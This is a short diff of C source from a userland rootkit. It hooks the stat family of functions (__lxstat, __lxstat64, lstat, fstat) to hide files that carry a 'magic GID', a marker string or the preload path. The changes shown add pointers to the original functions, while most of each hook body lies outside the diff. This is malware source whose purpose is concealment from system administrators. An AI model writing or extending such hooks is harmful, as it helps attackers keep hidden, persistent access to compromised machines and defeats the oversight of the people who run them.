@@ -3,6 +3,7 @@
 /*
   hook for __lxstat. Will be run by the rootkit internally to check file stats
 */
+int (*o_lxstat)(int, const char *, struct stat *);
 int __lxstat(int version, const char *path, struct stat *buf) {
 
 	#ifdef DEBUG
@@ -25,6 +26,7 @@ int __lxstat(int version, const char *path, struct stat *buf) {
 /*
  * __lxstat64() hook. Check for magic GID, and if set return an error.
 */
+int (*o_lxstat64)(int, const char *, struct stat64 *);
 int __lxstat64(int version, const char *path, struct stat64 *buf) {
 
 	#ifdef DEBUG
@@ -47,6 +49,7 @@ int __lxstat64(int version, const char *path, struct stat64 *buf) {
 /*
  * lstat() hook. Check for magic GID, STRING, and PRELOAD location and if set return an error.
 */
+int (*o_lstat)(const char *, struct stat *);
 int lstat(const char * path, struct stat * buf) {
 
 	#ifdef DEBUG
@@ -66,9 +69,11 @@ int lstat(const char * path, struct stat * buf) {
 
 	return result;
 }
+
 /*
  * Check if fd has the magic GID, and if set return NOENT.
 */
+int (*o_fstat)(int, struct stat *);
 int fstat(int filedes, struct stat *buf) {
 
 	#ifdef DEBUG
